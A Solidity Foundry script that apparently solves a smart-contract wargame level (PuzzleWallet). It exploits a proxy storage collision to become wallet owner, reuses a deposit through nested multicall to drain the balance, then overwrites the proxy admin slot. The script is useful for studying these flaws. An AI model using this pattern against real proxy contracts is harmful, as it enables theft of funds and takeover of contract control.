// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import  "../src/24.PuzzleWallet.sol";

contract PuzzleWalletScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        address puzzleProxyAddress = 0x86dF37FbBaD53E4EC2Af680495a42536F70CBE7C;
        
        // PuzzleProxy contract
        IPuzzleProxy puzzleProxy = IPuzzleProxy(puzzleProxyAddress);

        // admin of the PuzzleProxy is the deployer
        console.log("PuzzleProxy Admin:", puzzleProxy.admin());
        console.log("PuzzleProxy Pending Admin:", puzzleProxy.pendingAdmin());

        // PuzzleProxy delegatecall to PuzzleWallet so it behaves like PuzzleWallet
        PuzzleWallet puzzleProxyWallet = PuzzleWallet(puzzleProxyAddress);

        // owner of the PuzzleWallet is the admin
        console.log("PuzzleProxy Owner:", puzzleProxyWallet.owner());
        console.log("PuzzleProxy Max balance:", puzzleProxyWallet.maxBalance());

        // // implementation address is stored in implementationSlot
        // bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        // bytes32 implementationBytes32 = vm.load(address(puzzleProxyWallet), implementationSlot);
        // address implementationAddress = address(uint160(uint256(implementationBytes32)));

        // console.log("Implementation Address:", implementationAddress);

        // // implementation is the actual PuzzleWallet contract
        // PuzzleWallet implementation = PuzzleWallet(implementationAddress);

        // // implementation is not initialized yet though it doesn't matter
        // console.log("Implementation Owner:", implementation.owner());
        // console.log("Implementation tMax balance:", implementation.maxBalance());

        // propose new admin
        address player = vm.addr(privateKey);

        puzzleProxy.proposeNewAdmin(player);

        // owner of the PuzzleWallet changes to player
        console.log("PuzzleProxy Owner:", puzzleProxyWallet.owner());

        // add player to whitelist
        puzzleProxyWallet.addToWhitelist(player);

        // player is whitelisted
        console.log("PuzzleProxy Player whitelisted:", puzzleProxyWallet.whitelisted(player));

        // check balance of the PuzzleProxy
        uint256 puzzleProxyBalance = address(puzzleProxyWallet).balance;

        console.log("PuzzleProxy Balance:", puzzleProxyBalance);

        // deposit and execute data
        bytes memory depositData = abi.encodeWithSelector(puzzleProxyWallet.deposit.selector);
        bytes memory executeData = abi.encodeWithSelector(puzzleProxyWallet.execute.selector, player, puzzleProxyBalance * 2, "");
        
        // nested multicall data
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = depositData;

        // multicall data
        bytes[] memory data = new bytes[](3);
        data[0] = abi.encodeWithSelector(puzzleProxyWallet.multicall.selector, multicallData);
        data[1] = depositData;
        data[2] = executeData;        

        // multicall with puzzleProxyBalance
        puzzleProxyWallet.multicall{value: puzzleProxyBalance}(data);

        // balance of the PuzzleProxy should be 0
        console.log("PuzzleProxy Balance After multicall:", address(puzzleProxyWallet).balance);

        // setMaxBalance to player
        puzzleProxyWallet.setMaxBalance(uint256(uint160(player)));

        // admin should be changed to player
        console.log("PuzzleProxy Admin:", puzzleProxy.admin());

        vm.stopBroadcast();
    }
}

